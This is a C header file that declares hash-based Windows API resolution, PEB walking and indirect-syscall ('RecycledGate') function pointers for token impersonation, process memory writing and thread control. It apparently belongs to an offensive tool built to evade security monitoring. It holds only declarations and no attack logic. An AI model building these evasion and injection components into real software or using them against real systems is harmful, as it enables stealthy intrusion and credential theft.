#ifndef APIRESOLVE_H
#define APIRESOLVE_H

#include "windows.h"

#include "apidef.h"
#include "hashes.h"
#include "misc.h"
#include "peb.h"
#include "recycledgate.h"

typedef struct API {

	struct {

		LSTRCATA lstrcatA;
		LSTRCMPA lstrcmpA;
		LSTRCMPW lstrcmpW;

		CREATETOOLHELP32SNAPSHOT CreateToolhelp32Snapshot;
		PROCESS32FIRST Process32First;
		PROCESS32NEXT Process32Next;

		CLOSEHANDLE CloseHandle;
		VIRTUALALLOC VirtualAlloc;
		VIRTUALFREE VirtualFree;

		GETMODULEHANDLEA GetModuleHandleA;
		COPYMEMORY _CopyMemory;

	} Kernel32;

	struct {

		GETTOKENINFORMATION GetTokenInformation;
		IMPERSONATELOGGEDONUSER ImpersonateLoggedonUser;
		LOOKUPACCOUNTSIDA LookupAccountSidA;

	} Advapi32;

	struct {

		ENUMPROCESSMODULES EnumProcessModules;
		GETMODULEFILENAMEEXA GetModuleFileNameExA;

	} Psapi;

	struct {

		Syscall NtOpenProcess;
		Syscall NtOpenProcessToken;
		Syscall NtSuspendThread;
		Syscall NtResumeThread;
		Syscall NtOpenThread;
		Syscall NtQuerySystemInformation;
		Syscall NtDuplicateObject;
		Syscall NtAllocateVirtualMemory; 
		Syscall NtWriteVirtualMemory; 
		Syscall NtProtectVirtualMemory;

	} Nt;

} API, * PAPI;


BOOL ResolveApi(PAPI);
PVOID GetFunctionPtr(unsigned long, unsigned long);

PVOID getDllBase(unsigned long);
PVOID loadDll(unsigned long);
PVOID loadDll_byName(PSTR);
PVOID parseHdrForPtr(PBYTE, unsigned long);
PVOID followExport(LPSTR, unsigned long);
unsigned long xorHash(unsigned long);

#endif